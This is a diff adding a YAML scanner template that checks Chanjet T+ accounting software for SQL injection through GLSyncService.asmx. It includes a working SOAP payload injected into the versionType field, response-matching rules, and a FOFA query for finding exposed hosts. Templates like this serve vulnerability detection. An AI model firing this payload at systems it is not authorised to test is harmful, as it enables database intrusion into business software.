@@ -1,0 +1,36 @@
+id: poc-yaml-changjie-tplus-glsyncservice-asmx-sqli
+info:
+  name: 畅捷通T+ GLSyncService.asmx SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  - 两高一弱
+  finger: 畅捷通T+
+  fofa: app="畅捷通-TPlus"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: POST
+  path: /tplus/GLSyncService.asmx
+  headers:
+    Content-Type: text/xml; charset=utf-8
+    SOAPAction: http://www.chanjet.com/GetSourceAccountDataTable
+  data: "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\
+    \ xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\"\
+    >\n  <soap:Body>\n    <GetSourceAccountDataTable xmlns=\"http://www.chanjet.com/\"\
+    >\n      <versionType>' AND 9173 IN (SELECT (sys.fn_varbintohexstr(hashbytes('MD5',\
+    \ CAST('{{.t1}}' AS VARCHAR))))) AND 'rhYc'='rhYc</versionType>\n    </GetSourceAccountDataTable>\n\
+    \  </soap:Body>\n</soap:Envelope>"
+  expression: 'status_code == 500 &&
+
+    contains(body,"0x" + t2) &&
+
+    contains(content_type,"text/xml") &&
+
+    matches(body,"转换成数据类型(.*?)时失败") &&
+
+    matches(body,"在将(.*?)值")
+
+    '
+transport: http
